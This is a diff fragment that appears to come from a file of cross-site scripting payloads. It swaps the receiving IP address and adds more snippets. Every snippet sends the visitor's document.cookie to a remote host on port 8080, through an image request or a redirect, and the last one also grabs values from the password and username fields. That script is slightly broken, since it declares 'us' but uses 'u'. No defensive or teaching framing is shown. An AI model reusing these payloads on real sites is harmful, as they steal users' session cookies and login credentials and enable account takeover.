@@ -73,5 +73,20 @@ var img = new Image(0,0); img.src='189.132.235.118:8080/?cookie=' + document.coo
 document.write(img)
 </script>
 <script>
-document.location="http://189.132.235.118:8080/?cookie="+document.cookie;
+document.location="http://143.110.136.16:8080/?cookie="+document.cookie;
+</script>
+
+143.110.136.16
+<script>
+document.write('<img src="http://143.110.136.16:8080/?cookie=' + document.cookie + '" />')
+</script>
+
+
+<script>
+    var p='PASS'
+   document.getElementsByName('password').forEach(e=>{console.log(p=p+''+e.value )})
+   var us='USER'
+      document.getElementsByName('username').forEach(e=>{console.log(u=u+''+e.value )})
+      document.write('<img src="http://143.110.136.16:8080/?cookie=' + document.cookie +u+p+'" />')
+
 </script>
